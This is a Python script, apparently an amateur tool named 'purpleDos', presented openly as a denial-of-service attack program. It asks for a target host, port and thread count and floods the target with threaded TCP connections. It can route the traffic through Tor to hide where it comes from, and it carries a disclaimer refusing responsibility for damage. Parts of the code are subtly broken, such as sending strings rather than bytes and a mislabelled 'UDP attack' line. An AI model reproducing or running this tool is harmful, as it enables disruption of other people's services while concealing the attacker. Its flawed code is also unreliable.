import socket
import socks
import threading
import time
from datetime import datetime

print("DoS attack by Lars L. | Germany |")
print("---------------------------------")
print("---------------------------------")
print("---------------------------------")
print("Close the window to cancel")
print("[!] | REMINDER | DoS'sing is illegal and you can go to jail!")
print("------------------------------------------------------------")
print("[!]IM NOT RESPONSABLE FOR ANY DAMAGE YOU DO WHILE USING THIS PROGRAM!")
print("Starting noWlan1.1/purpleDos 1.1 By Lars")

class DoS:
	def __init__(self, host, port, nThreads, UseTor):
		self.host = host
		self.port = port
		self.nThreads = nThreads
		self.UseTor = UseTor
		self.TPS = 0
		self.Delimiter = 2000

		if self.UseTor:
			socks.set_default_proxy(socks.SOCKS5, '127.0.0.1', 9150)

		self.threads = []

		self.message = '-_-_-_-_-| DoS |-_-_-_-_-'

	def SendAttack(self):

		if self.UseTor:
			s = socks.socksocket()
			
		else:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

		try:
			s.connect((self.host, self.port))
			s.send(self.message) # TCP Attack
			s.sendto(self.message, (self.host, self.port)) # UDP Attack
			self.TPS -= 1
		except socket.error:
			pass

		s.close()

	def Attack(self):

		for i in range(self.nThreads):
			t = threading.Thread(target = self.SendAttack)
			self.threads.append(t)

		for i in self.threads:
			i.start()

			while self.TPS >= self.Delimiter:
				pass

			self.TPS += 1

		for i in self.threads:
			i.join()

Tor = input('[*] Did you want to use Tor (Y/N): ').lower()
host = input('[!] Enter Target Host Address: ')
port = int(input('[!] Enter Target Port to Attack: '))
threads = int(input('[!] Enter number of Attacks: '))

UseTor = False

if Tor == 'y':
	UseTor = True

hostip = socket.gethostbyname(host)

DoS = DoS(host, port, threads, UseTor)

print('\nHost %s ... IP %s' % (host, hostip))
print('\n\n[!] Starting The Attack! %s...' % (time.strftime("%H:%M:%S")))
print("[!] Attack Started")
start_time = datetime.now()

DoS.Attack()

end_time = datetime.now()
total_time = end_time - start_time

print('\n[!] The Attack Was Done At %s...' % (time.strftime("%H:%M:%S")))
print('[!] Total Attack Time %s...' % (total_time))